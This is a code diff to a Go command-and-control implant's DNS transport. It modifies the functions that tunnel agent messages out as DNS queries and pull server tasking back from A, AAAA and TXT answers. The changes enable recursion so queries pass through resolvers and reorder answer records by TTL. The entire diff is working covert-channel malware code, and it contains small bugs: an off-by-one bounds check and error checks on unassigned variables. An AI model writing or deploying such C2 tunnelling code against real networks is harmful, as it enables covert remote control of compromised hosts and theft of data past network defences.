@@ -620,6 +620,8 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 		chunkErrors := 0
 		for i := 0; i < chunks && chunkErrors < 10; i++ {
 			m := new(dns.Msg)
+			m.RecursionAvailable = true
+			m.RecursionDesired = true
 			m.SetEdns0(4096, true)
 			jsonData, err := proto.Marshal(sendingStream.Messages[sendingStream.StartBytes[i]])
 			if err != nil {
@@ -652,86 +654,105 @@ func (c *C2DNS) streamDNSPacketToServer(msg string) uint32 {
 				time.Sleep(1 * time.Second)
 				chunkErrors += 1
 			}
-			//utils.PrintDebug(fmt.Sprintf("response from server: %v\n", response))
-			if len(response.Answer) == 4 {
-				var ackAgentSessionID net.IP
-				var ackMessageID net.IP
-				var ackStartByte net.IP
-				var ackAction net.IP
-				if c.getRequestType() == dns.TypeA {
-					ackAgentSessionID = response.Answer[0].(*dns.A).A
-					ackMessageID = response.Answer[1].(*dns.A).A
-					ackStartByte = response.Answer[2].(*dns.A).A
-					ackAction = response.Answer[3].(*dns.A).A
-				} else if c.getRequestType() == dns.TypeAAAA {
-					ackAgentSessionID = response.Answer[0].(*dns.AAAA).AAAA
-					ackMessageID = response.Answer[1].(*dns.AAAA).AAAA
-					ackStartByte = response.Answer[2].(*dns.AAAA).AAAA
-					ackAction = response.Answer[3].(*dns.AAAA).AAAA
-				} else if c.getRequestType() == dns.TypeTXT {
-					ackAgentSessionID = make([]byte, net.IPv4len)
-					sessionID, err := strconv.Atoi(response.Answer[0].(*dns.TXT).Txt[0])
-					if err != nil {
-						utils.PrintDebug(fmt.Sprintf("failed to convert sessionID to int: %v\n", err))
-						continue
-					}
-					binary.LittleEndian.PutUint32(ackAgentSessionID, uint32(sessionID))
-
-					ackMessageID = make([]byte, net.IPv4len)
-					msgMessageID, _ := strconv.Atoi(response.Answer[1].(*dns.TXT).Txt[0])
-					if err != nil {
-						utils.PrintDebug(fmt.Sprintf("failed to convert msgMessageID to int: %v\n", err))
-						continue
-					}
-					binary.LittleEndian.PutUint32(ackMessageID, uint32(msgMessageID))
-
-					ackStartByte = make([]byte, net.IPv4len)
-					msgStartByte, _ := strconv.Atoi(response.Answer[2].(*dns.TXT).Txt[0])
-					if err != nil {
-						utils.PrintDebug(fmt.Sprintf("failed to convert msgStartByte to int: %v\n", err))
-						continue
-					}
-					binary.LittleEndian.PutUint32(ackStartByte, uint32(msgStartByte))
-
-					ackAction = make([]byte, net.IPv4len)
-					msgAction, _ := strconv.Atoi(response.Answer[3].(*dns.TXT).Txt[0])
-					if err != nil {
-						utils.PrintDebug(fmt.Sprintf("failed to convert msgAction to int: %v\n", err))
-						continue
-					}
-					binary.LittleEndian.PutUint32(ackAction, uint32(msgAction))
-				} else {
-					// uh oh
-				}
-				if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != sendingStream.Messages[sendingStream.StartBytes[i]].AgentSessionID {
-					i-- // somehow we got a message back that's not for our session id, try again
-					time.Sleep(100 * time.Millisecond)
-					continue
-				}
-				if binary.LittleEndian.Uint32(ackMessageID[:]) != sendingStream.Messages[sendingStream.StartBytes[i]].MessageID {
-					i-- // somehow we got a message back that's not for our session id, try again
-					time.Sleep(100 * time.Millisecond)
-					continue
-				}
-				if !slices.Contains(ackStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
-					// ack for something we already sent, just ignore it and move on
-					ackStream.StartBytes = append(ackStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:]))
-				}
-				if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
-					// something happened and the server is asking to retransmit the message
-					utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", sendingStream.Messages[sendingStream.StartBytes[i]].MessageID))
-					ackStream.StartBytes = make([]uint32, 0)
-					i = -1
-				} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ServerToAgent) {
-					i = chunks // just to make sure we get out of this loop
-					//utils.PrintDebug(fmt.Sprintf("Server got all message and has a response for us to fetch"))
-				}
-
-			} else {
+			if response.Rcode != dns.RcodeSuccess {
+				time.Sleep(1 * time.Second)
+				chunkErrors += 1
+				utils.PrintDebug(fmt.Sprintf("Failed to get successful response: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
+				continue
+			}
+			if len(response.Answer) != 4 {
 				i-- // deprecate the count and try again
 				time.Sleep(1 * time.Second)
 				chunkErrors += 1
 				utils.PrintDebug(fmt.Sprintf("failed to get at least 4 response pieces: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
+			}
+			ackValues := make([]dns.RR, len(response.Answer))
+			var ackAgentSessionID net.IP
+			var ackMessageID net.IP
+			var ackStartByte net.IP
+			var ackAction net.IP
+			badAnswers := false
+			for answerIndex := range response.Answer {
+				if response.Answer[answerIndex].Header().Ttl > uint32(len(ackValues)) {
+					i-- // deprecate the count and try again
+					time.Sleep(1 * time.Second)
+					chunkErrors += 1
+					utils.PrintDebug(fmt.Sprintf("Got 4 pieces, but TTL values are wrong: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
+					badAnswers = true
+					break
+				}
+				ackValues[response.Answer[answerIndex].Header().Ttl] = response.Answer[answerIndex]
+			}
+			if badAnswers {
+				continue
+			}
+			if c.getRequestType() == dns.TypeA {
+				ackAgentSessionID = ackValues[0].(*dns.A).A
+				ackMessageID = ackValues[1].(*dns.A).A
+				ackStartByte = ackValues[2].(*dns.A).A
+				ackAction = ackValues[3].(*dns.A).A
+			} else if c.getRequestType() == dns.TypeAAAA {
+				ackAgentSessionID = ackValues[0].(*dns.AAAA).AAAA
+				ackMessageID = ackValues[1].(*dns.AAAA).AAAA
+				ackStartByte = ackValues[2].(*dns.AAAA).AAAA
+				ackAction = ackValues[3].(*dns.AAAA).AAAA
+			} else if c.getRequestType() == dns.TypeTXT {
+				ackAgentSessionID = make([]byte, net.IPv4len)
+				sessionID, err := strconv.Atoi(ackValues[0].(*dns.TXT).Txt[0])
+				if err != nil {
+					utils.PrintDebug(fmt.Sprintf("failed to convert sessionID to int: %v\n", err))
+					continue
+				}
+				binary.LittleEndian.PutUint32(ackAgentSessionID, uint32(sessionID))
+
+				ackMessageID = make([]byte, net.IPv4len)
+				msgMessageID, _ := strconv.Atoi(ackValues[1].(*dns.TXT).Txt[0])
+				if err != nil {
+					utils.PrintDebug(fmt.Sprintf("failed to convert msgMessageID to int: %v\n", err))
+					continue
+				}
+				binary.LittleEndian.PutUint32(ackMessageID, uint32(msgMessageID))
+
+				ackStartByte = make([]byte, net.IPv4len)
+				msgStartByte, _ := strconv.Atoi(ackValues[2].(*dns.TXT).Txt[0])
+				if err != nil {
+					utils.PrintDebug(fmt.Sprintf("failed to convert msgStartByte to int: %v\n", err))
+					continue
+				}
+				binary.LittleEndian.PutUint32(ackStartByte, uint32(msgStartByte))
+
+				ackAction = make([]byte, net.IPv4len)
+				msgAction, _ := strconv.Atoi(ackValues[3].(*dns.TXT).Txt[0])
+				if err != nil {
+					utils.PrintDebug(fmt.Sprintf("failed to convert msgAction to int: %v\n", err))
+					continue
+				}
+				binary.LittleEndian.PutUint32(ackAction, uint32(msgAction))
+			} else {
+				// uh oh
+			}
+			if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != sendingStream.Messages[sendingStream.StartBytes[i]].AgentSessionID {
+				i-- // somehow we got a message back that's not for our session id, try again
+				time.Sleep(100 * time.Millisecond)
+				continue
+			}
+			if binary.LittleEndian.Uint32(ackMessageID[:]) != sendingStream.Messages[sendingStream.StartBytes[i]].MessageID {
+				i-- // somehow we got a message back that's not for our session id, try again
+				time.Sleep(100 * time.Millisecond)
+				continue
+			}
+			if !slices.Contains(ackStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
+				// ack for something we already sent, just ignore it and move on
+				ackStream.StartBytes = append(ackStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:]))
+			}
+			if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
+				// something happened and the server is asking to retransmit the message
+				utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", sendingStream.Messages[sendingStream.StartBytes[i]].MessageID))
+				ackStream.StartBytes = make([]uint32, 0)
+				i = -1
+			} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ServerToAgent) {
+				i = chunks // just to make sure we get out of this loop
+				//utils.PrintDebug(fmt.Sprintf("Server got all message and has a response for us to fetch"))
 			}
 		}
 		if chunkErrors < 10 {
@@ -769,6 +790,8 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 			domain := c.getDomain()
 			utils.PrintDebug(fmt.Sprintf("getting message (%d) from server via domain (%s)", messageID, domain))
 			m := new(dns.Msg)
+			m.RecursionAvailable = true
+			m.RecursionDesired = true
 			m.SetEdns0(4096, true)
 			jsonData, err := proto.Marshal(request)
 			if err != nil {
@@ -805,177 +828,191 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 				c.increaseErrorCount(domain)
 				continue
 			}
-			//utils.PrintDebug(fmt.Sprintf("response from server: %v\n", response))
-			if len(response.Answer) >= 4 {
-				packetBytes := make([]byte, 0)
-				var ackAgentSessionID net.IP
-				var ackMessageID net.IP
-				var ackStartByte net.IP
-				var ackAction net.IP
-				if c.getRequestType() == dns.TypeA {
-					ackAgentSessionID = response.Answer[0].(*dns.A).A
-					ackMessageID = response.Answer[1].(*dns.A).A
-					ackStartByte = response.Answer[2].(*dns.A).A
-					ackAction = response.Answer[3].(*dns.A).A
-					if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != c.AgentSessionID {
-						// somehow we got a message back that's not for our session id, try again
-						time.Sleep(100 * time.Millisecond)
-						continue
-					}
-					if binary.LittleEndian.Uint32(ackMessageID[:]) != messageID {
-						// somehow we got a message back that's not for our session id, try again
-						time.Sleep(100 * time.Millisecond)
-						continue
-					}
-					if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
-						// something happened and the server is asking to retransmit the message
-						utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
-						receivingStream.StartBytes = make([]uint32, 0)
-					} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_MessageLost) {
-						utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
-						return nil
-					} else if slices.Contains(receivingStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
-						// we've already received this one, continue on
-						continue
-					} else {
-						for j := 4; j < len(response.Answer); j++ {
-							// now we're actually starting to get data from the response
-							packetBytes = append(packetBytes, response.Answer[j].(*dns.A).A[:]...)
-						}
-					}
-				} else if c.getRequestType() == dns.TypeAAAA {
-					ackAgentSessionID = response.Answer[0].(*dns.AAAA).AAAA
-					ackMessageID = response.Answer[1].(*dns.AAAA).AAAA
-					ackStartByte = response.Answer[2].(*dns.AAAA).AAAA
-					ackAction = response.Answer[3].(*dns.AAAA).AAAA
-					if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != c.AgentSessionID {
-						// somehow we got a message back that's not for our session id, try again
-						time.Sleep(100 * time.Millisecond)
-						continue
-					}
-					if binary.LittleEndian.Uint32(ackMessageID[:]) != messageID {
-						// somehow we got a message back that's not for our session id, try again
-						time.Sleep(100 * time.Millisecond)
-						continue
-					}
-					if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
-						// something happened and the server is asking to retransmit the message
-						utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
-						receivingStream.StartBytes = make([]uint32, 0)
-					} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_MessageLost) {
-						utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
-						return nil
-					} else if slices.Contains(receivingStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
-						// we've already received this one, continue on
-						continue
-					} else {
-						for j := 4; j < len(response.Answer); j++ {
-							// now we're actually starting to get data from the response
-							packetBytes = append(packetBytes, response.Answer[j].(*dns.AAAA).AAAA[:]...)
-						}
-					}
-				} else if c.getRequestType() == dns.TypeTXT {
-					ackAgentSessionID = make([]byte, net.IPv4len)
-					sessionID, err := strconv.Atoi(response.Answer[0].(*dns.TXT).Txt[0])
-					if err != nil {
-						utils.PrintDebug(fmt.Sprintf("failed to convert sessionID to int: %v\n", err))
-						continue
-					}
-					binary.LittleEndian.PutUint32(ackAgentSessionID, uint32(sessionID))
-
-					ackMessageID = make([]byte, net.IPv4len)
-					msgMessageID, _ := strconv.Atoi(response.Answer[1].(*dns.TXT).Txt[0])
-					if err != nil {
-						utils.PrintDebug(fmt.Sprintf("failed to convert msgMessageID to int: %v\n", err))
-						continue
-					}
-					binary.LittleEndian.PutUint32(ackMessageID, uint32(msgMessageID))
-
-					ackStartByte = make([]byte, net.IPv4len)
-					msgStartByte, _ := strconv.Atoi(response.Answer[2].(*dns.TXT).Txt[0])
-					if err != nil {
-						utils.PrintDebug(fmt.Sprintf("failed to convert msgStartByte to int: %v\n", err))
-						continue
-					}
-					binary.LittleEndian.PutUint32(ackStartByte, uint32(msgStartByte))
-
-					ackAction = make([]byte, net.IPv4len)
-					msgAction, _ := strconv.Atoi(response.Answer[3].(*dns.TXT).Txt[0])
-					if err != nil {
-						utils.PrintDebug(fmt.Sprintf("failed to convert msgAction to int: %v\n", err))
-						continue
-					}
-					binary.LittleEndian.PutUint32(ackAction, uint32(msgAction))
-
-					if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != c.AgentSessionID {
-						// somehow we got a message back that's not for our session id, try again
-						time.Sleep(100 * time.Millisecond)
-						continue
-					}
-					if binary.LittleEndian.Uint32(ackMessageID[:]) != messageID {
-						// somehow we got a message back that's not for our session id, try again
-						time.Sleep(100 * time.Millisecond)
-						continue
-					}
-					if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
-						// something happened and the server is asking to retransmit the message
-						utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
-						receivingStream.StartBytes = make([]uint32, 0)
-					} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_MessageLost) {
-						utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
-						return nil
-					} else if slices.Contains(receivingStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
-						// we've already received this one, continue on
-						continue
-					} else {
-						for j := 4; j < len(response.Answer); j++ {
-							// now we're actually starting to get data from the response
-							answer := response.Answer[j].(*dns.TXT).Txt
-							msgBytes := ""
-							for _, k := range answer {
-								msgBytes += k
-							}
-							decodedBytes, _ := base64.StdEncoding.DecodeString(msgBytes)
-							packetBytes = append(packetBytes, decodedBytes...)
-						}
-					}
-				} else {
-
-				}
-
-				receivedPacket := &dnsgrpc.DnsPacket{}
-				err = proto.Unmarshal(removeTrailingNulls(packetBytes), receivedPacket)
-				if err != nil {
-					utils.PrintDebug(fmt.Sprintf("failed to unmarshal received packet: %v\n", err))
-					time.Sleep(1 * time.Second)
-					c.increaseErrorCount(domain)
-					continue
-				}
-
-				receivingStream.StartBytes = append(receivingStream.StartBytes, receivedPacket.Begin)
-				receivingStream.Size += uint32(len(receivedPacket.Data))
-				receivingStream.Messages[receivedPacket.Begin] = receivedPacket
-				lastChunk += uint32(len(receivedPacket.Data))
-				if receivingStream.Size == receivedPacket.Size {
-					utils.PrintDebug(fmt.Sprintf("receive message: Size (%d), Chunks (%d)", receivedPacket.Size, len(receivingStream.StartBytes)))
-					totalBuffer := ""
-					// sort all the start bytes to be in order
-					sort.Slice(receivingStream.StartBytes, func(i, j int) bool { return i < j })
-					// iterate over the start bytes and add the corresponding string data together
-					for i := 0; i < len(receivingStream.StartBytes); i++ {
-						totalBuffer += receivingStream.Messages[receivingStream.StartBytes[i]].Data
-					}
-					// we got the whole message
-					//utils.PrintDebug(fmt.Sprintf("got the whole message: %v\n", totalBuffer))
-					return []byte(totalBuffer)
-				}
-				break
-
-			} else {
+			if len(response.Answer) < 4 {
 				time.Sleep(1 * time.Second)
 				c.increaseErrorCount(domain)
 				utils.PrintDebug(fmt.Sprintf("failed to get at least 4 response pieces: %d, %s", len(response.Answer), dns.Fqdn(finalData+domain)))
+				continue
 			}
+			//utils.PrintDebug(fmt.Sprintf("response from server: %v\n", response))
+			ackValues := make([]dns.RR, len(response.Answer))
+			badAnswers := false
+			for answerIndex := range response.Answer {
+				if response.Answer[answerIndex].Header().Ttl > uint32(len(ackValues)) {
+					time.Sleep(1 * time.Second)
+					utils.PrintDebug(fmt.Sprintf("Got pieces, but TTL values are wrong: %d, %s, %v", len(response.Answer), dns.Fqdn(finalData+domain), response))
+					badAnswers = true
+					break
+				}
+				ackValues[response.Answer[answerIndex].Header().Ttl] = response.Answer[answerIndex]
+			}
+			if badAnswers {
+				continue
+			}
+			packetBytes := make([]byte, 0)
+			var ackAgentSessionID net.IP
+			var ackMessageID net.IP
+			var ackStartByte net.IP
+			var ackAction net.IP
+
+			if c.getRequestType() == dns.TypeA {
+				ackAgentSessionID = ackValues[0].(*dns.A).A
+				ackMessageID = ackValues[1].(*dns.A).A
+				ackStartByte = ackValues[2].(*dns.A).A
+				ackAction = ackValues[3].(*dns.A).A
+				if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != c.AgentSessionID {
+					// somehow we got a message back that's not for our session id, try again
+					time.Sleep(100 * time.Millisecond)
+					continue
+				}
+				if binary.LittleEndian.Uint32(ackMessageID[:]) != messageID {
+					// somehow we got a message back that's not for our session id, try again
+					time.Sleep(100 * time.Millisecond)
+					continue
+				}
+				if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
+					// something happened and the server is asking to retransmit the message
+					utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
+					receivingStream.StartBytes = make([]uint32, 0)
+				} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_MessageLost) {
+					utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
+					return nil
+				} else if slices.Contains(receivingStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
+					// we've already received this one, continue on
+					continue
+				} else {
+					for j := 4; j < len(ackValues); j++ {
+						// now we're actually starting to get data from the response
+						packetBytes = append(packetBytes, ackValues[j].(*dns.A).A[:]...)
+					}
+				}
+			} else if c.getRequestType() == dns.TypeAAAA {
+				ackAgentSessionID = ackValues[0].(*dns.AAAA).AAAA
+				ackMessageID = ackValues[1].(*dns.AAAA).AAAA
+				ackStartByte = ackValues[2].(*dns.AAAA).AAAA
+				ackAction = ackValues[3].(*dns.AAAA).AAAA
+				if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != c.AgentSessionID {
+					// somehow we got a message back that's not for our session id, try again
+					time.Sleep(100 * time.Millisecond)
+					continue
+				}
+				if binary.LittleEndian.Uint32(ackMessageID[:]) != messageID {
+					// somehow we got a message back that's not for our session id, try again
+					time.Sleep(100 * time.Millisecond)
+					continue
+				}
+				if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
+					// something happened and the server is asking to retransmit the message
+					utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
+					receivingStream.StartBytes = make([]uint32, 0)
+				} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_MessageLost) {
+					utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
+					return nil
+				} else if slices.Contains(receivingStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
+					// we've already received this one, continue on
+					continue
+				} else {
+					for j := 4; j < len(ackValues); j++ {
+						// now we're actually starting to get data from the response
+						packetBytes = append(packetBytes, ackValues[j].(*dns.AAAA).AAAA[:]...)
+					}
+				}
+			} else if c.getRequestType() == dns.TypeTXT {
+				ackAgentSessionID = make([]byte, net.IPv4len)
+				sessionID, err := strconv.Atoi(ackValues[0].(*dns.TXT).Txt[0])
+				if err != nil {
+					utils.PrintDebug(fmt.Sprintf("failed to convert sessionID to int: %v\n", err))
+					continue
+				}
+				binary.LittleEndian.PutUint32(ackAgentSessionID, uint32(sessionID))
+
+				ackMessageID = make([]byte, net.IPv4len)
+				msgMessageID, _ := strconv.Atoi(ackValues[1].(*dns.TXT).Txt[0])
+				if err != nil {
+					utils.PrintDebug(fmt.Sprintf("failed to convert msgMessageID to int: %v\n", err))
+					continue
+				}
+				binary.LittleEndian.PutUint32(ackMessageID, uint32(msgMessageID))
+
+				ackStartByte = make([]byte, net.IPv4len)
+				msgStartByte, _ := strconv.Atoi(ackValues[2].(*dns.TXT).Txt[0])
+				if err != nil {
+					utils.PrintDebug(fmt.Sprintf("failed to convert msgStartByte to int: %v\n", err))
+					continue
+				}
+				binary.LittleEndian.PutUint32(ackStartByte, uint32(msgStartByte))
+
+				ackAction = make([]byte, net.IPv4len)
+				msgAction, _ := strconv.Atoi(ackValues[3].(*dns.TXT).Txt[0])
+				if err != nil {
+					utils.PrintDebug(fmt.Sprintf("failed to convert msgAction to int: %v\n", err))
+					continue
+				}
+				binary.LittleEndian.PutUint32(ackAction, uint32(msgAction))
+
+				if binary.LittleEndian.Uint32(ackAgentSessionID[:]) != c.AgentSessionID {
+					// somehow we got a message back that's not for our session id, try again
+					time.Sleep(100 * time.Millisecond)
+					continue
+				}
+				if binary.LittleEndian.Uint32(ackMessageID[:]) != messageID {
+					// somehow we got a message back that's not for our session id, try again
+					time.Sleep(100 * time.Millisecond)
+					continue
+				}
+				if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_ReTransmit) {
+					// something happened and the server is asking to retransmit the message
+					utils.PrintDebug(fmt.Sprintf("ReTransmit message: %v\n", messageID))
+					receivingStream.StartBytes = make([]uint32, 0)
+				} else if binary.LittleEndian.Uint32(ackAction[:]) == uint32(dnsgrpc.Actions_MessageLost) {
+					utils.PrintDebug(fmt.Sprintf("Message lost on server: %v\n", messageID))
+					return nil
+				} else if slices.Contains(receivingStream.StartBytes, binary.LittleEndian.Uint32(ackStartByte[:])) {
+					// we've already received this one, continue on
+					continue
+				} else {
+					for j := 4; j < len(ackValues); j++ {
+						// now we're actually starting to get data from the response
+						answer := ackValues[j].(*dns.TXT).Txt
+						msgBytes := ""
+						for _, k := range answer {
+							msgBytes += k
+						}
+						decodedBytes, _ := base64.StdEncoding.DecodeString(msgBytes)
+						packetBytes = append(packetBytes, decodedBytes...)
+					}
+				}
+			} else {
+
+			}
+
+			receivedPacket := &dnsgrpc.DnsPacket{}
+			err = proto.Unmarshal(removeTrailingNulls(packetBytes), receivedPacket)
+			if err != nil {
+				utils.PrintDebug(fmt.Sprintf("failed to unmarshal received packet: %v\n", err))
+				time.Sleep(1 * time.Second)
+				c.increaseErrorCount(domain)
+				continue
+			}
+
+			receivingStream.StartBytes = append(receivingStream.StartBytes, receivedPacket.Begin)
+			receivingStream.Size += uint32(len(receivedPacket.Data))
+			receivingStream.Messages[receivedPacket.Begin] = receivedPacket
+			lastChunk += uint32(len(receivedPacket.Data))
+			if receivingStream.Size == receivedPacket.Size {
+				utils.PrintDebug(fmt.Sprintf("receive message: Size (%d), Chunks (%d)", receivedPacket.Size, len(receivingStream.StartBytes)))
+				totalBuffer := ""
+				// sort all the start bytes to be in order
+				sort.Slice(receivingStream.StartBytes, func(i, j int) bool { return i < j })
+				// iterate over the start bytes and add the corresponding string data together
+				for i := 0; i < len(receivingStream.StartBytes); i++ {
+					totalBuffer += receivingStream.Messages[receivingStream.StartBytes[i]].Data
+				}
+				// we got the whole message
+				//utils.PrintDebug(fmt.Sprintf("got the whole message: %v\n", totalBuffer))
+				return []byte(totalBuffer)
+			}
+			break
 		}
 	}
 }
